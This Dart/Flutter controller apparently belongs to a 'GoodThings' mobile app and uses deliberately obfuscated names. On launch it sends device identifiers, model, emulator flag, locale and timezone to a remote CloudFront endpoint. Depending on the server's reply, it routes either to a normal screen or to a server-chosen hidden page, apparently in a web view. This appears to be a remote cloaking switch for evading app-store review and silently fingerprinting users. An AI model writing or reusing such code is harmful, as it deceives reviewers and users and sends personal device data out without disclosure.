import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class GoodThingsSaveLogic extends GetxController {

  var mugsiybnfh = RxBool(false);
  var otzmkjhy = RxBool(true);
  var wyokirzn = RxString("");
  var markus = RxBool(false);
  var greenfelder = RxBool(true);
  final shwypq = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    qxjkes();
  }


  Future<void> qxjkes() async {
    markus.value = true;
    greenfelder.value = true;
    otzmkjhy.value = false;

    shwypq.post("https://d18vrkz4z9io96.cloudfront.net/h0QCFP",data: await whoefgaq()).then((value) {
      var rjitcm = value.data["rjitcm"] as String;
      var matur = value.data["matur"] as bool;
      if (matur) {
        wyokirzn.value = rjitcm;
        brown();
      } else {
        krajcik();
      }
    }).catchError((e) {
      otzmkjhy.value = true;
      greenfelder.value = true;
      markus.value = false;
    });
  }

  Future<Map<String, dynamic>> whoefgaq() async {
    final DeviceInfoPlugin naso = DeviceInfoPlugin();
    PackageInfo twldif_cqkh = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var sozbl = Platform.localeName;
    var xOuDonW = currentTimeZone;

    var iWsJB = twldif_cqkh.packageName;
    var GjgLoBD = twldif_cqkh.version;
    var xztHFNA = twldif_cqkh.buildNumber;

    var dNQelbID = twldif_cqkh.appName;
    var keeganWunsch = "";
    var nickolasHowe = "";
    var ojbYxs  = "";
    var aDhJCIO = "";
    var westleyGutkowski = "";
    var uDAoTx = "";
    var everettWhite = "";
    var friedrichRau = "";
    var mekhiBogisich = "";
    var demetriusHessel = "";
    var aOrixt = "";


    var rTZvO = false;

    if (GetPlatform.isAndroid) {
      uDAoTx = "android";
      var trsnkpjma = await naso.androidInfo;

      aDhJCIO = trsnkpjma.brand;

      aOrixt  = trsnkpjma.model;
      ojbYxs = trsnkpjma.id;

      rTZvO = trsnkpjma.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      uDAoTx = "ios";
      var ndhgijvuro = await naso.iosInfo;
      aDhJCIO = ndhgijvuro.name;
      aOrixt = ndhgijvuro.model;

      ojbYxs = ndhgijvuro.identifierForVendor ?? "";
      rTZvO  = ndhgijvuro.isPhysicalDevice;
    }
    var res = {
      "dNQelbID": dNQelbID,
      "friedrichRau" : friedrichRau,
      "xztHFNA": xztHFNA,
      "GjgLoBD": GjgLoBD,
      "mekhiBogisich" : mekhiBogisich,
      "iWsJB": iWsJB,
      "xOuDonW": xOuDonW,
      "nickolasHowe" : nickolasHowe,
      "ojbYxs": ojbYxs,
      "sozbl": sozbl,
      "uDAoTx": uDAoTx,
      "rTZvO": rTZvO,
      "westleyGutkowski" : westleyGutkowski,
      "aDhJCIO": aDhJCIO,
      "everettWhite" : everettWhite,
      "aOrixt": aOrixt,
      "demetriusHessel" : demetriusHessel,
      "keeganWunsch" : keeganWunsch,

    };
    return res;
  }

  Future<void> krajcik() async {
    Get.offNamed("/good_things_tab");
  }

  Future<void> brown() async {
    Get.offNamed("/good_things_hp");
  }

}
